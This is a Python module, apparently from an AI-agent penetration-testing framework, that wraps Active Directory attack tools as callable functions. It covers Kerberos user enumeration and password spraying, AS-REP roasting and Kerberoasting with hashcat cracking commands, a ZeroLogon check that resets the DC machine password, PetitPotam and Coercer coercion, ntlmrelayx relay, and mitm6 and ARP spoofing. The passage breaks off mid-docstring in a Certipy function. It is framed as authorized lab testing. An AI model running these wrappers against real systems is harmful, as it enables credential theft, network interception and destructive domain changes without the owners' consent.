"""
Active Directory Attack Tools - For authorized penetration testing of Windows AD environments.
Includes enumeration, Kerberos attacks, NTLM relay, and more.
"""

import subprocess
import os
import ipaddress
import shutil
import socket
import sys
from src.sdk.tool import function_tool
from src.tools.argv import drop_managed_options, safe_split_options


def _is_ip(value: str) -> bool:
    try:
        ipaddress.ip_address(value)
        return True
    except ValueError:
        return False


def _resolve_context_ip(hostname: str) -> str:
    try:
        from src.sdk.context_hub import get_context_hub

        chub = get_context_hub()
        for subdomain in chub.findings.get("subdomains", []):
            if subdomain.get("subdomain", "").lower() == hostname.lower():
                return subdomain.get("ip", "") or ""
    except Exception:
        pass
    return ""


def _resolve_nameserver(target: str) -> str:
    if _is_ip(target):
        return target
    try:
        socket.gethostbyname(target)
        return ""
    except OSError:
        return _resolve_context_ip(target)


def _infer_dc_hostname(target: str, domain: str, dc_hostname: str = "") -> str:
    if dc_hostname:
        return dc_hostname.strip()
    if not _is_ip(target):
        return target
    try:
        from src.repl.profiles import get_profile_manager

        profile = get_profile_manager().load_profile(target)
        for subdomain in profile.subdomains:
            if subdomain.lower().endswith("." + domain.lower()) and subdomain.lower().startswith("dc"):
                return subdomain
    except Exception:
        pass
    return f"dc1.{domain}" if domain else target


def _find_on_path_or_venv(*names: str) -> str:
    """Find a binary on PATH, then in the active Python environment's bin/Scripts dir."""
    for name in names:
        found = shutil.which(name)
        if found:
            return found

    script_dir = os.path.dirname(sys.executable)
    for name in names:
        candidate = os.path.join(script_dir, name)
        if os.path.exists(candidate):
            return candidate
    return ""


def _resolve_wordlist(path: str, purpose: str = "username") -> tuple[str, str]:
    """Resolve common SecLists/Kali wordlist path variants and typoed basenames."""
    requested = (path or "").strip()
    if requested and os.path.exists(os.path.expanduser(requested)):
        return os.path.expanduser(requested), ""

    username_defaults = [
        "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
        "/usr/share/seclists/Usernames/cirt-default-usernames.txt",
        "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
        "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt",
        "/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt",
        "/usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt",
    ]
    password_defaults = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
        "/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt",
    ]
    defaults = password_defaults if purpose == "password" else username_defaults

    basename = os.path.basename(requested)
    aliases = {
        "xato-net-10million-usernames-100.txt": "xato-net-10-million-usernames.txt",
        "xato-net-10million-usernames.txt": "xato-net-10-million-usernames.txt",
        "names.txt": "Names/names.txt",
    }
    if basename in aliases:
        alias = aliases[basename]
        for root in (
            "/usr/share/seclists/Usernames",
            "/usr/share/wordlists/SecLists/Usernames",
        ):
            candidate = os.path.join(root, alias)
            if os.path.exists(candidate):
                return candidate, f"[wordlist resolver] Replaced missing {requested!r} with {candidate!r}."

    if basename:
        for root in (
            "/usr/share/seclists",
            "/usr/share/wordlists/SecLists",
            "/usr/share/wordlists",
        ):
            if not os.path.isdir(root):
                continue
            for current_root, _, files in os.walk(root):
                if basename in files:
                    candidate = os.path.join(current_root, basename)
                    return candidate, f"[wordlist resolver] Found {basename!r} at {candidate!r}."

    for candidate in defaults:
        if os.path.exists(candidate):
            if requested:
                return candidate, f"[wordlist resolver] Missing {requested!r}; using installed fallback {candidate!r}."
            return candidate, f"[wordlist resolver] Using installed fallback {candidate!r}."

    install_hint = (
        "Install SecLists/wordlists or pass a local file path. "
        "Kali: sudo apt install -y seclists wordlists"
    )
    return "", f"Error: Wordlist not found at {requested or '<empty>'}. {install_hint}"


@function_tool()
def sync_kerberos_time(dc_ip: str, domain: str = "") -> str:
    """
    Synchronise the local system clock with a Domain Controller to satisfy
    Kerberos' 5-minute skew requirement.

    CRITICAL — run this FIRST whenever:
      • nmap reports |_clock-skew > 5 minutes
      • kerbrute / impacket returns KRB_AP_ERR_SKEW
      • bloodhound-python fails with Kerberos TGT errors
      • evil-winrm silently times out on an AD target

    The tool attempts the following strategies in order (stops at first success):
      1. ntpdate  <dc_ip>   — most reliable, requires root
      2. rdate -n <dc_ip>   — fallback NTP client
      3. net time \\\\<dc_ip> /set /yes  — Windows fallback (rare on Kali)
      4. Query SMB/LDAP time and print a manual `date -s` command + faketime hint

    Args:
        dc_ip:   Domain Controller IP address (e.g. "10.129.45.74")
        domain:  Domain name — used only for display / confirmation (optional)

    Returns:
        Success/failure status, current skew measurement, and next-step guidance
    """
    import re
    import datetime

    if not dc_ip.strip():
        return "Error: dc_ip is required."

    results: list[str] = []
    synced = False

    # ── Strategy 1: ntpdate ──────────────────────────────────────────────────
    if shutil.which("ntpdate"):
        try:
            r = subprocess.run(
                ["ntpdate", dc_ip],
                capture_output=True, text=True, timeout=15,
            )
            out = (r.stdout + r.stderr).strip()
            results.append(f"[ntpdate] {out}")
            if r.returncode == 0 and ("adjust" in out.lower() or "offset" in out.lower() or not out):
                synced = True
        except subprocess.TimeoutExpired:
            results.append("[ntpdate] timed out")
        except Exception as e:
            results.append(f"[ntpdate] error: {e}")

    # ── Strategy 2: rdate ────────────────────────────────────────────────────
    if not synced and shutil.which("rdate"):
        try:
            r = subprocess.run(
                ["rdate", "-n", dc_ip],
                capture_output=True, text=True, timeout=15,
            )
            out = (r.stdout + r.stderr).strip()
            results.append(f"[rdate] {out}")
            if r.returncode == 0:
                synced = True
        except subprocess.TimeoutExpired:
            results.append("[rdate] timed out")
        except Exception as e:
            results.append(f"[rdate] error: {e}")

    # ── Strategy 3: net time (Windows / Samba) ───────────────────────────────
    if not synced and shutil.which("net"):
        try:
            r = subprocess.run(
                ["net", "time", f"\\\\{dc_ip}", "/set", "/yes"],
                capture_output=True, text=True, timeout=15,
            )
            out = (r.stdout + r.stderr).strip()
            results.append(f"[net time] {out}")
            if r.returncode == 0:
                synced = True
        except Exception as e:
            results.append(f"[net time] error: {e}")

    # ── Strategy 4: Query DC time via nmap / impacket for manual fix ─────────
    dc_time_str = ""
    dc_datetime = None

    # Try impacket-smbclient/smbmap to read server time
    if shutil.which("nmblookup") or shutil.which("nmap"):
        try:
            r = subprocess.run(
                ["nmap", "-p", "445", "--script", "smb2-time", dc_ip, "-oG", "-"],
                capture_output=True, text=True, timeout=30,
            )
            # Parse "date: 2026-05-01T14:04:17" from nmap SMB2 script output
            m = re.search(r"date:\s*([\d\-T:]+)", r.stdout + r.stderr)
            if m:
                dc_time_str = m.group(1)
                try:
                    dc_datetime = datetime.datetime.fromisoformat(dc_time_str)
                except ValueError:
                    pass
        except Exception:
            pass

    if not dc_datetime:
        # Fallback: try to read DC time from SMB via smbclient
        try:
            r = subprocess.run(
                ["smbclient", f"//{dc_ip}/IPC$", "-N", "-c", "exit"],
                capture_output=True, text=True, timeout=10,
            )
            m = re.search(r"(\w{3}\s+\w{3}\s+\d+\s+[\d:]+\s+\d{4})", r.stderr)
            if m:
                dc_time_str = m.group(1)
        except Exception:
            pass

    local_time = datetime.datetime.utcnow()
    skew_info = ""
    faketime_offset = ""

    if dc_datetime:
        skew = dc_datetime - local_time
        skew_seconds = int(skew.total_seconds())
        abs_skew = abs(skew_seconds)
        sign = "+" if skew_seconds >= 0 else "-"
        h, rem = divmod(abs_skew, 3600)
        m2, s2 = divmod(rem, 60)
        skew_info = f"Clock skew: {sign}{h:02d}h{m2:02d}m{s2:02d}s (DC={dc_datetime.isoformat()}, Local={local_time.isoformat()[:19]})"
        faketime_offset = f"{sign}{abs_skew}s"

    # ── Build result report ───────────────────────────────────────────────────
    lines = ["## Kerberos Time Sync Report", ""]
    lines += results

    if synced:
        lines += [
            "",
            "✅ Clock synchronised successfully.",
            skew_info,
            "",
            "All Kerberos tools (kerbrute, impacket, bloodhound, evil-winrm) should now work.",
        ]
    else:
        lines += [
            "",
            "⚠️  Automatic sync failed (likely need root/sudo).",
            skew_info,
            "",
            "── Manual fixes (run in your Kali terminal) ──────────────────────",
        ]
        if dc_datetime:
            date_cmd = dc_datetime.strftime("sudo date -s '%Y-%m-%d %H:%M:%S'")
            lines.append(f"  Option A (set system clock):  {date_cmd}")
            if faketime_offset:
                lines.append(
                    f"  Option B (per-command, no root): prefix commands with "
                    f"faketime '{faketime_offset}'"
                )
                lines.append(
                    f"    Example: faketime '{faketime_offset}' kerbrute userenum -d {domain or '<domain>'} "
                    f"--dc {dc_ip} users.txt"
                )
        else:
            lines.append(f"  sudo ntpdate {dc_ip}   # or: sudo rdate -n {dc_ip}")
            lines.append(
                "  If that fails, run nmap with --script smb2-time to get the DC clock, "
                "then: sudo date -s 'YYYY-MM-DD HH:MM:SS'"
            )
        lines += [
            "",
            "── Why this matters ──────────────────────────────────────────────",
            "  Kerberos rejects tickets with >5 min skew (KRB_AP_ERR_SKEW).",
            "  This silently breaks: kerbrute, bloodhound-python, evil-winrm,",
            "  impacket (GetNPUsers, GetUserSPNs, secretsdump, psexec).",
        ]

    return "\n".join(lines)


@function_tool()
def enum4linux_scan(target: str, options: str = "-a") -> str:
    """
    SMB/Samba enumeration using enum4linux-ng (improved version).
    Enumerates users, shares, groups, policies from Windows/Samba systems.

    Args:
        target: Target IP or hostname
        options: Scan options (-a=all, -U=users, -S=shares, -G=groups, -P=policies)

    Returns:
        Enumeration results including users, shares, and policies
    """
    option_args, option_error = safe_split_options(options, "options")
    if option_error:
        return option_error

    try:
        cmd = ["enum4linux-ng", target]
        cmd.extend(option_args)
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300
        )
        return result.stdout or result.stderr or "No results"
    except FileNotFoundError:
        return "Error: enum4linux-ng not found. Install with: pip install enum4linux-ng"
    except subprocess.TimeoutExpired:
        return "Error: enum4linux-ng timed out after 5 minutes"
    except Exception as e:
        return f"Error running enum4linux-ng: {str(e)}"


@function_tool()
def ldapsearch_query(target: str, base_dn: str = "", query: str = "(objectClass=*)", options: str = "-x") -> str:
    """
    LDAP enumeration using ldapsearch.
    Query Active Directory for users, computers, groups, and more.
    
    Args:
        target: LDAP server IP or hostname
        base_dn: Base DN for search (e.g., "DC=domain,DC=local")
        query: LDAP filter (default: all objects)
        options: ldapsearch options (-x=simple auth, -b=base dn)
    
    Returns:
        LDAP query results
    """
    option_args, option_error = safe_split_options(options, "options")
    if option_error:
        return option_error

    sanitized_args: list[str] = []
    warnings: list[str] = []
    skip_next = False
    managed_flags = {"-H"}
    if base_dn:
        managed_flags.add("-b")
    option_args, dropped = drop_managed_options(option_args, managed_flags)
    if dropped:
        warnings.append(f"Dropped wrapper-managed ldapsearch option(s): {' '.join(dropped)}")

    deref_values = {"never", "always", "search", "find"}
    idx = 0
    while idx < len(option_args):
        part = option_args[idx]
        if skip_next:
            skip_next = False
            idx += 1
            continue
        if part == "-a":
            next_part = option_args[idx + 1] if idx + 1 < len(option_args) else ""
            if next_part not in deref_values:
                warnings.append("Dropped ldapsearch '-a' because it was missing one of: never, always, search, find")
                idx += 1
                continue
            sanitized_args.extend([part, next_part])
            skip_next = True
        elif part == "-o" and idx + 1 < len(option_args):
            value = option_args[idx + 1].replace("ldif-wrap=", "ldif_wrap=")
            sanitized_args.extend([part, value])
            skip_next = True
        else:
            sanitized_args.append(part)
        idx += 1

    try:
        cmd = ["ldapsearch", "-H", f"ldap://{target}"]
        cmd.extend(sanitized_args)
        
        if base_dn:
            cmd.extend(["-b", base_dn])
        
        cmd.append(query)
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=120
        )
        output = result.stdout or result.stderr or "No results"
        if warnings:
            output = "[WRAPPER WARNINGS]\n" + "\n".join(warnings) + "\n\n" + output
        return output
    except FileNotFoundError:
        return "Error: ldapsearch not found. Install with: sudo apt install ldap-utils"
    except subprocess.TimeoutExpired:
        return "Error: ldapsearch timed out"
    except Exception as e:
        return f"Error running ldapsearch: {str(e)}"


@function_tool()
def kerbrute_userenum(dc_ip: str, domain: str, userlist: str) -> str:
    """
    Kerberos username enumeration and password spraying using Kerbrute.
    Fast way to discover valid AD usernames.
    
    Args:
        dc_ip: Domain Controller IP address
        domain: Domain name (e.g., "domain.local")
        userlist: Path to username wordlist
    
    Returns:
        Valid usernames discovered
    """
    resolved_userlist, resolver_note = _resolve_wordlist(userlist, "username")
    if not resolved_userlist:
        return resolver_note
    try:
        result = subprocess.run(
            ["kerbrute", "userenum", "-d", domain, "--dc", dc_ip, resolved_userlist],
            capture_output=True,
            text=True,
            timeout=600
        )
        output = (result.stdout + "\n" + result.stderr).strip() or "No valid users found"
        return (resolver_note + "\n" if resolver_note else "") + output
    except FileNotFoundError:
        return "Error: kerbrute not found. Download from: https://github.com/ropnop/kerbrute"
    except subprocess.TimeoutExpired:
        return "Error: kerbrute timed out after 10 minutes"
    except Exception as e:
        return f"Error running kerbrute: {str(e)}"


@function_tool()
def kerbrute_spray(dc_ip: str, domain: str, userlist: str, password: str) -> str:
    """
    Kerberos password spraying using Kerbrute.
    Test one password against many users (stealthy).
    
    Args:
        dc_ip: Domain Controller IP address
        domain: Domain name (e.g., "domain.local")
        userlist: Path to username list
        password: Password to spray
    
    Returns:
        Successful authentications
    """
    resolved_userlist, resolver_note = _resolve_wordlist(userlist, "username")
    if not resolved_userlist:
        return resolver_note
    try:
        result = subprocess.run(
            ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, resolved_userlist, password],
            capture_output=True,
            text=True,
            timeout=600
        )
        output = (result.stdout + "\n" + result.stderr).strip() or "No successful logins"
        return (resolver_note + "\n" if resolver_note else "") + output
    except FileNotFoundError:
        return "Error: kerbrute not found. Download from: https://github.com/ropnop/kerbrute"
    except subprocess.TimeoutExpired:
        return "Error: kerbrute timed out"
    except Exception as e:
        return f"Error running kerbrute: {str(e)}"


@function_tool()
def bloodhound_collector(
    target: str,
    username: str,
    password: str,
    domain: str,
    collection: str = "All",
    nameserver: str = "",
    dc_hostname: str = "",
    output_dir: str = "",
) -> str:
    """
    BloodHound data collection using bloodhound-python.
    Collects AD data for attack path analysis.
    
    Args:
        target: Domain Controller IP or hostname
        username: Domain username for authentication
        password: Password for authentication
        domain: Domain name (e.g., "domain.local")
        collection: Collection method (All, DCOnly, Group, LocalAdmin, Session, etc.)
        nameserver: Optional DNS server IP for lab-only hostnames
        dc_hostname: Optional DC FQDN when target is an IP
        output_dir: Optional directory for BloodHound JSON artifacts
    
    Returns:
        Collection status and output files location
    """
    if not shutil.which("bloodhound-python"):
        return "Error: bloodhound-python not found. Install with: pip install bloodhound"

    dc_target = _infer_dc_hostname(target, domain, dc_hostname)

    # Auto-nameserver: when target is an IP and no explicit nameserver is given,
    # use the target IP itself so bloodhound-python can resolve domain FQDNs
    # (e.g. dc1.ping.htb) via the DC's own DNS — the #1 cause of
    # "Failed to resolve LDAP server IP" in HTB/CTF labs.
    if nameserver.strip():
        ns_target = nameserver.strip()
    elif _is_ip(target):
        ns_target = target  # Use the DC's own DNS
    else:
        ns_target = _resolve_nameserver(target)

    cwd = None
    if output_dir:
        cwd = output_dir
    else:
        try:
            from src.repl.target_manager import get_target_manager

            session_dir = getattr(get_target_manager(), "session_dir", "")
            if session_dir:
                cwd = session_dir
        except Exception:
            pass
    if cwd:
        try:
            os.makedirs(cwd, exist_ok=True)
        except OSError:
            cwd = None

    cmd = [
        "bloodhound-python",
        "-u", username,
        "-p", password,
        "-d", domain,
        "-dc", dc_target,
        "-c", collection,
        "--disable-autogc",
    ]
    if ns_target:
        cmd.extend(["-ns", ns_target])

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=600,
            cwd=cwd,
        )
        output = (result.stdout + ("\n[STDERR]\n" + result.stderr if result.stderr else "")).strip()
        artifact_dir = cwd or os.getcwd()
        if result.returncode != 0:
            return (
                "BloodHound collection failed.\n"
                f"Command target: -dc {dc_target}" + (f" -ns {ns_target}" if ns_target else "") + "\n"
                f"Artifact directory: {artifact_dir}\n{output}"
            )
        return f"BloodHound Collection Complete:\n{output}\nJSON files saved in: {artifact_dir}"
    except subprocess.TimeoutExpired:
        return "Error: BloodHound collection timed out"
    except Exception as e:
        return f"Error running bloodhound: {str(e)}"




@function_tool()
def impacket_asreproast(
    target: str,
    domain: str,
    users: str = "",
    userfile: str = "",
    output_hash_file: str = "",
) -> str:
    """
    AS-REP Roasting using Impacket's impacket-GetNPUsers.

    Requests Kerberos TGT tickets for accounts with Pre-Authentication DISABLED.
    No credentials required. Returned hashes ($krb5asrep$) can be cracked with:
      hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
      john --format=krb5asrep hashes.txt

    CRITICAL: Run this FIRST on any AD target before trying NTLM-based attacks.
    Especially when NTLM is disabled (NTLM:False in crackmapexec output).

    Also fixes the "Rubeus not available" issue on Linux/Kali — use this instead.

    Args:
        target:           Domain Controller IP address
        domain:           Domain name (e.g., "ping.htb")
        users:            Comma-separated usernames to test (e.g., "administrator,john")
        userfile:         Path to file with one username per line
        output_hash_file: Optional path to write hashes for cracking

    Returns:
        AS-REP hashes in hashcat format or "no vulnerable accounts found"
    """
    import tempfile as _tf
    tool = _find_on_path_or_venv("impacket-GetNPUsers", "GetNPUsers.py")
    if not tool:
        return (
            "Error: impacket-GetNPUsers not found.\n"
            "Install: sudo apt install python3-impacket   or   pip install impacket"
        )

    ufile = None
    resolver_note = ""
    if userfile:
        ufile, resolver_note = _resolve_wordlist(userfile, "username")
        if not ufile:
            return resolver_note
    elif users:
        tmp = _tf.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
        for u in users.replace(",", "\n").splitlines():
            u = u.strip()
            if u:
                tmp.write(u + "\n")
        tmp.close()
        ufile = tmp.name

    cmd = [tool, f"{domain}/", "-request", "-format", "hashcat", "-dc-ip", target, "-no-pass"]
    if ufile:
        cmd += ["-usersfile", ufile]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        output = (result.stdout + "\n" + result.stderr).strip()
        if "KRB_AP_ERR_SKEW" in output:
            output += "\n\n⚠️  KERBEROS CLOCK SKEW DETECTED! Run sync_kerberos_time(dc_ip=\'...\', domain=\'...\') FIRST."

        if output_hash_file and "$krb5asrep$" in output:
            hashes = [l for l in output.splitlines() if "$krb5asrep$" in l]
            with open(output_hash_file, "w") as hf:
                hf.write("\n".join(hashes) + "\n")
            output += f"\n[Hashes written to: {output_hash_file}]"
            output += f"\n[Crack: hashcat -m 18200 {output_hash_file} /usr/share/wordlists/rockyou.txt]"

        if not output:
            return "No output from GetNPUsers. Check DC reachability and domain name."
        prefix = "[AS-REP HASHES FOUND]\n" if "$krb5asrep$" in output else ""
        return prefix + ((resolver_note + "\n") if resolver_note else "") + output
    except subprocess.TimeoutExpired:
        return "Error: GetNPUsers timed out (120s). Check DC reachability."
    except Exception as e:
        return f"Error running GetNPUsers: {e}"


@function_tool()
def impacket_kerberoast(
    target: str,
    domain: str,
    username: str,
    password: str = "",
    hash_value: str = "",
    output_hash_file: str = "",
    kerberos_only: bool = True,
) -> str:
    """
    Kerberoasting using Impacket's impacket-GetUserSPNs.

    Requests service tickets (TGS) for accounts with SPNs. Returned hashes
    ($krb5tgs$) can be cracked with:
      hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
      john --format=krb5tgs hashes.txt

    Requires valid domain credentials (username + password OR NTLM hash).
    Use impacket_asreproast first if you have NO credentials yet.

    Args:
        target:           Domain Controller IP address
        domain:           Domain name (e.g., "ping.htb")
        username:         Authenticated domain username
        password:         Password for authentication
        hash_value:       NTLM hash (LM:NT format) instead of password
        output_hash_file: Optional path to write captured hashes
        kerberos_only:    Force Kerberos auth (no NTLM fallback). Set True when
                          NTLM is disabled on the DC (default: True)

    Returns:
        Kerberoast TGS hashes in hashcat format or error
    """
    tool = shutil.which("impacket-GetUserSPNs") or shutil.which("GetUserSPNs.py")
    if not tool:
        return (
            "Error: impacket-GetUserSPNs not found.\n"
            "Install: sudo apt install python3-impacket   or   pip install impacket"
        )

    target_spec = f"{domain}/{username}"
    if password:
        target_spec += f":{password}"

    cmd = [tool, target_spec, "-request", "-dc-ip", target]
    if hash_value:
        cmd += ["-hashes", hash_value]
    if kerberos_only:
        cmd.append("-k")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        output = (result.stdout + "\n" + result.stderr).strip()
        if "KRB_AP_ERR_SKEW" in output:
            output += "\n\n⚠️  KERBEROS CLOCK SKEW DETECTED! Run sync_kerberos_time(dc_ip=\'...\', domain=\'...\') FIRST."

        if output_hash_file and "$krb5tgs$" in output:
            hashes = [l for l in output.splitlines() if "$krb5tgs$" in l]
            with open(output_hash_file, "w") as hf:
                hf.write("\n".join(hashes) + "\n")
            output += f"\n[Hashes written to: {output_hash_file}]"
            output += f"\n[Crack: hashcat -m 13100 {output_hash_file} /usr/share/wordlists/rockyou.txt]"

        if not output:
            return "No output from GetUserSPNs. Check credentials and DC connectivity."
        return ("[KERBEROAST HASHES FOUND]\n" if "$krb5tgs$" in output else "") + output
    except subprocess.TimeoutExpired:
        return "Error: GetUserSPNs timed out. Check DC reachability and credentials."
    except Exception as e:
        return f"Error running GetUserSPNs: {e}"


@function_tool()
def rubeus_attack(attack: str, options: str = "") -> str:
    """
    Kerberos attacks using Rubeus (Windows-only) or Impacket equivalents on Linux.

    On Linux/Kali: use the dedicated impacket tools instead:
      - impacket_asreproast() — AS-REP roasting (no creds required)
      - impacket_kerberoast() — Kerberoasting (requires valid user creds)

    Args:
        attack: Attack type (asreproast, kerberoast, harvest, tgtdeleg, monitor)
        options: Additional Rubeus options

    Returns:
        Attack results or redirect to Impacket equivalent
    """
    option_args, option_error = safe_split_options(options, "options")
    if option_error:
        return option_error

    rubeus = shutil.which("Rubeus.exe") or shutil.which("Rubeus")
    if not rubeus:
        # Redirect to the correct Impacket tool
        atk = attack.lower()
        if atk in ("asreproast", "asrep"):
            return (
                "Rubeus not available on Linux. Use the impacket_asreproast tool instead:\n"
                "  impacket_asreproast(target='<DC_IP>', domain='<domain>', users='<user1,user2>')\n"
                "  No credentials required for AS-REP roasting."
            )
        if atk in ("kerberoast",):
            return (
                "Rubeus not available on Linux. Use the impacket_kerberoast tool instead:\n"
                "  impacket_kerberoast(target='<DC_IP>', domain='<domain>', username='<user>', password='<pass>')"
            )
        return (
            f"Error: Rubeus not found. On Linux/Kali, use Impacket equivalents:\n"
            f"  AS-REP roasting  → impacket_asreproast(target, domain, users)\n"
            f"  Kerberoasting    → impacket_kerberoast(target, domain, username, password)\n"
            f"  (Attack requested: {attack})"
        )

    cmd = [rubeus, attack]
    cmd.extend(option_args)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout or result.stderr or "No output"
    except Exception as e:
        return f"Error running Rubeus: {e}"

@function_tool()
def zerologon_check(dc_ip: str, dc_name: str) -> str:
    """
    Check for ZeroLogon vulnerability (CVE-2020-1472).
    CRITICAL: This resets the DC machine account password!
    
    Args:
        dc_ip: Domain Controller IP address
        dc_name: Domain Controller NetBIOS name (without $)
    
    Returns:
        Vulnerability status
    """
    try:
        result = subprocess.run(
            ["python3", "/opt/zerologon/zerologon_tester.py", dc_name, dc_ip],
            capture_output=True,
            text=True,
            timeout=60
        )
        output = result.stdout or result.stderr
        if "Success" in output or "VULNERABLE" in output.upper():
            return f"⚠️ VULNERABLE TO ZEROLOGON!\n{output}"
        return f"Not vulnerable or check failed:\n{output}"
    except FileNotFoundError:
        return "Error: zerologon_tester.py not found. Clone: https://github.com/SecuraBV/CVE-2020-1472"
    except Exception as e:
        return f"Error checking ZeroLogon: {str(e)}"


@function_tool()
def petitpotam_coerce(target: str, listener: str) -> str:
    """
    PetitPotam NTLM relay coercion attack.
    Coerces a Windows host to authenticate to your listener.
    
    Args:
        target: Target host IP (DC or server with AD CS)
        listener: Your listener IP (where to relay auth)
    
    Returns:
        Coercion attempt result
    """
    try:
        result = subprocess.run(
            ["python3", "/opt/PetitPotam/PetitPotam.py", listener, target],
            capture_output=True,
            text=True,
            timeout=60
        )
        return result.stdout or result.stderr or "Coercion attempted"
    except FileNotFoundError:
        return "Error: PetitPotam.py not found. Clone: https://github.com/topotam/PetitPotam"
    except Exception as e:
        return f"Error running PetitPotam: {str(e)}"


@function_tool()
def ntlmrelayx_start(target: str, options: str = "-smb2support") -> str:
    """
    Start NTLM relay attack using Impacket's ntlmrelayx.
    Relay captured NTLM authentication to other services.
    
    Args:
        target: Target for relaying (IP or SMB URL)
        options: Additional options (-smb2support, -t for target, -i for interactive)
    
    Returns:
        Relay status and captured credentials
    """
    option_args, option_error = safe_split_options(options, "options")
    if option_error:
        return option_error

    try:
        cmd = ["ntlmrelayx.py", "-t", target]
        cmd.extend(option_args)
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30  # Just start it, don't wait
        )
        return f"ntlmrelayx started. Target: {target}\n{result.stdout or result.stderr}"
    except FileNotFoundError:
        return "Error: ntlmrelayx.py not found. Install: pip install impacket"
    except subprocess.TimeoutExpired:
        return f"ntlmrelayx running in background, targeting {target}"
    except Exception as e:
        return f"Error starting ntlmrelayx: {str(e)}"


@function_tool()
def mitm6_attack(domain: str, options: str = "") -> str:
    """
    IPv6 MITM attack using mitm6.
    Poisons IPv6 DNS to redirect traffic to attacker.
    
    Args:
        domain: Target domain to poison
        options: Additional options (-i interface, -4 IPv4 target)
    
    Returns:
        Attack status
    """
    option_args, option_error = safe_split_options(options, "options")
    if option_error:
        return option_error

    try:
        cmd = ["mitm6", "-d", domain]
        cmd.extend(option_args)
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        return result.stdout or result.stderr or "mitm6 started"
    except FileNotFoundError:
        return "Error: mitm6 not found. Install with: pip install mitm6"
    except subprocess.TimeoutExpired:
        return f"mitm6 running, poisoning domain: {domain}"
    except Exception as e:
        return f"Error running mitm6: {str(e)}"


@function_tool()
def arpspoof_attack(target: str, gateway: str, interface: str = "eth0") -> str:
    """
    ARP spoofing attack using arpspoof (dsniff).
    Man-in-the-middle attack on local network.
    
    Args:
        target: Target IP to poison
        gateway: Gateway IP to impersonate
        interface: Network interface to use
    
    Returns:
        Attack status
    """
    try:
        result = subprocess.run(
            ["arpspoof", "-i", interface, "-t", target, gateway],
            capture_output=True,
            text=True,
            timeout=30
        )
        return result.stdout or result.stderr or "ARP spoofing started"
    except FileNotFoundError:
        return "Error: arpspoof not found. Install with: sudo apt install dsniff"
    except subprocess.TimeoutExpired:
        return f"arpspoof running. Target: {target}, Gateway: {gateway}"
    except Exception as e:
        return f"Error running arpspoof: {str(e)}"

# ─────────────────────────────────────────────────────────────────────────────
# Advanced AD attacks (Coercer / Certipy / Timeroast / RBCD / DCSync)
# ─────────────────────────────────────────────────────────────────────────────

def _run(cmd: list[str], timeout: int = 600) -> str:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        out = (r.stdout or "")
        if r.stderr:
            out += "\n[STDERR]\n" + r.stderr
        return out.strip() or f"(no output, exit={r.returncode})"
    except FileNotFoundError:
        return f"Error: {cmd[0]} not on PATH"
    except subprocess.TimeoutExpired:
        return f"Error: {cmd[0]} timed out after {timeout}s"
    except Exception as e:
        return f"Error: {e}"


# ─────────────────────────────────────────────────────────────────────────────
# Coercer multi (NTLM-coercion family)
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def coercer_multi(
    target: str,
    listener: str,
    username: str = "",
    password: str = "",
    nt_hash: str = "",
    domain: str = "",
    methods: str = "all",
) -> str:
    """
    Coerce a target to authenticate to our listener — covers PrinterBug,
    PetitPotam, DFSCoerce, ShadowCoerce, MS-EVEN6, etc. Replaces the
    single-method petitpotam_coerce wrapper.

    Pre-req: ntlmrelayx_start or responder running on `listener`.

    Args:
        target:   Victim host (DC IP/hostname expected to authenticate)
        listener: Our IP that NTLM auth will be relayed to / captured by
        username: Optional creds (Coercer can run unauthenticated for some methods)
        password: Optional password
        nt_hash:  Optional NT hash
        domain:   AD domain
        methods:  all | printerbug | petitpotam | dfscoerce | shadowcoerce | mseven6
    """
    bin_path = shutil.which("Coercer") or shutil.which("Coercer.py") or shutil.which("coercer")
    if not bin_path:
        return ("Error: Coercer not on PATH. Install: pip install Coercer "
                "or git clone https://github.com/p0dalirius/Coercer")

    cmd = [bin_path, "coerce", "-t", target, "-l", listener]
    if username:
        cmd += ["-u", username]
    if password:
        cmd += ["-p", password]
    if nt_hash:
        cmd += ["--hashes", f":{nt_hash}" if ":" not in nt_hash else nt_hash]
    if domain:
        cmd += ["-d", domain]

    method = methods.lower()
    if method != "all":
        method_map = {
            "printerbug": "MS-RPRN",
            "petitpotam": "MS-EFSR",
            "dfscoerce": "MS-DFSNM",
            "shadowcoerce": "MS-FSRVP",
            "mseven6": "MS-EVEN6",
        }
        if method in method_map:
            cmd += ["--filter-protocol-name", method_map[method]]

    out = _run(cmd, timeout=300)
    return f"## Coercer multi: {target} → {listener}\n\n{out}\n\n[Next] Check ntlmrelayx output for relayed creds / SMB-signed hosts."


# ─────────────────────────────────────────────────────────────────────────────
# Certipy ESC chain
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def certipy_esc_chain(
    dc_ip: str,
    domain: str,
    username: str,
    password: str = "",
    nt_hash: str = "",
    ca: str = "",
    template: str = "",
    upn_target: str = "",
    output_dir: str = "",
) -> str:
    """
    Drive Certipy find → identify ESC class → run the matching abuse.

    Step 1: certipy find -vulnerable -enabled
    Step 2: parse output → if ESC1/4/6/8/9/11 detected, suggest exact next command
    Step 3: if `template` is supplied, run the abuse end-to-end and return the
            resulting .pfx + the impersonation command.

    Args:
        dc_ip:      Domain Controller IP
        domain:     AD domain
        username:   Authenticating principal
